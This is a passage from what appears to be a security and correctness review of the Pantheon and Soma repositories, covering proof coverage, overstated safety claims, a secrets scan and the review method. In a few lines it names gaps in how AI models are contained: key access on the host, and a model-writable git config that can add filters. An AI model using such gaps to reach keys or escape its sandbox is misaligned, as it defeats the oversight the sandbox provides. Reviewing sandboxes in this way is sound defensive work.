  only by case/Unicode normalization can split a mixed macOS/Linux network.
- Soma reuses an OCaml build directory per source path without cleaning it
  (`toplevel/somaOcaml.ml:485-496`); a stale `_build` can affect a later
  build. `soma get` writes `soma.toml`/`soma.lock` non-atomically
  (`somaDeps.ml:204-210,499-502`).

---

# Proofs and claims

**What is actually proved.** `consensus.proof` and `market.proof` contain more
than the "Proved so far" table in `docs/PROOFS.md:7-16`: the table lists six
theorems, while the files also prove `r_decide_needs_quorum`,
`r_catch_up_needs_weak`, `locks_only_move_forward`, `one_precommit_per_round`,
the local rule invariants, and the `maybe_draw` preservation lemmas. The
table is stale (under-claiming, not over-claiming).

**What is claimed beyond the proofs.**

- `docs/SAFETY.md:9-26` says "Every merge therefore has the leader and at
  least one attestor agreeing on the tree. With at most one faulty agent, an
  honest node computed it." The formal part proves the approval counts
  (`without_fallback_two_attestors_must_approve`,
  `fallback_still_needs_an_attestor`), not the tree rule or that an honest
  node computed the tree; `docs/PROOFS.md:32-36` lists the merge/tree rule as
  "next". The "therefore" is an informal argument.
- Global consensus safety ("no two honest nodes decide different values") is
  not proved; `docs/PROOFS.md:29-31` lists the model-check as next. The
  restart-lock issue (P-4) is outside the local proofs.
- `docs/DESIGN.md:44-45` ("a crash loses nothing that had been agreed") is
  true for decided blocks, not for locks.
- `docs/DESIGN.md:70-80` ("a value is fixed in advance", "revealing is all an
  agent controls") is false for the 64-link `reaches` (P-8).
- `docs/SAFETY.md:45-60` ("Models are kept away from keys") is true in the
  sandbox, false on the host (P-1).
- `docs/SAFETY.md:42-44` ("Git runs with no user or system config, no hooks,
  and no signing") is true for the node's git; the model-writable
  `PANTHEON_GITDIR` config can still add filters (P-2).
- `docs/SAFETY.md:62-67` ("CI can't reach anything") is too strong for
  `ci-sandbox` (P-12).

**Soma's kernel.** `GRADUAL.md:15` says conservativity and graduality are
"kept (by design, not mechanically proven here)"; `Gradual.v:33-44` says the
logic is intentionally inconsistent once `unknown`/`err` are used
(`unknown False : False`). `soma hash` records assumptions and
`soma explore` flags fake evidence, but Pantheon CI runs only `soma build`
(S-4). The shell's `sha256`, `hash_list`, `decode_tx` and `run` are
assumptions (`shell.definition`, `docs/DESIGN.md:18-20`). The proofs reason
about Peano `nat`, while `main.soma` extracts to OCaml ints and redefines
`Nat.div`/`Nat.modulo`; the shell's `num`/`num_opt` and the extraction are not
covered.

---

# Secrets and history

No private key, token or credential was found in either repository's files or
history. The only key-shaped strings are test fixtures in
`pantheon/reference/go/internal/agent/agent_test.go:33-35`
(`BEGIN RSA PRIVATE KEY`, `sk-...`), and the docs examples. Commit author names and emails are in both histories, as usual. `docs/HOST.md` and
`docs/DOGFOOD-REPORT.md` mention the host `zucc` (Fedora Asahi) and branch
names. `docs/DOGFOOD-REPORT.md:25` says a rejected bid carried a ChatGPT
account id in a Codex `error.log`, and that the chain with it stays on the
host, not in the repository; the repository itself is clean. Before public:

- decide whether the commit emails, `yevbar` URLs and host details stay;
- update the "Soma is private" statements (`docs/NETWORK.md:25`,
  `docs/DOGFOOD.md:18`, `scripts/setup-node.sh:10,21`, `README` of Soma) if
  Soma is becoming public;
- consider a `SECURITY.md` and a license for Pantheon (Soma keeps Rocq's
  LGPL-2.1).

---

# Method and coverage

Read `pantheon/README.md`, `docs/DESIGN.md`, `docs/SAFETY.md`,
`docs/PROOFS.md`, `docs/NETWORK.md`, `docs/HOST.md`, `docs/SANDBOX.md`,
`docs/DOGFOOD*.md`, `docs/SECURITY-REVIEW.md`, the `.soma`/`.proof`/`shell.ml`
files, all `scripts/`, `deploy/`, `test/`, and the relevant Soma fork diff
(`git -C soma diff d77b754ffa HEAD`, excluding `theories/Stdlib`, the test
suite and docs). Read `topbin/soma.ml`, `vernac/soma*.ml`, `toplevel/soma*.ml`,
`plugins/soma_{rocq,ocaml,wasm,lean,explore}`, `kernel/gradual.ml`,
`pretyping/gradualTyping.ml`, and `theories/Soma/{Sandbox,OCaml,Orchestrate}.v`.
Searched both histories for key-shaped strings and checked author emails.
Tests were not run (the brief says Soma's toolchain must be built); the small
OCaml snippets confirmed `Sys.executable_name` is relative when invoked as
`./exe`, `Filename.concat` does not normalize `..`, and the Soma SHA-256
matches the standard vectors for `""`, `"abc"` and 1000 `a`s.
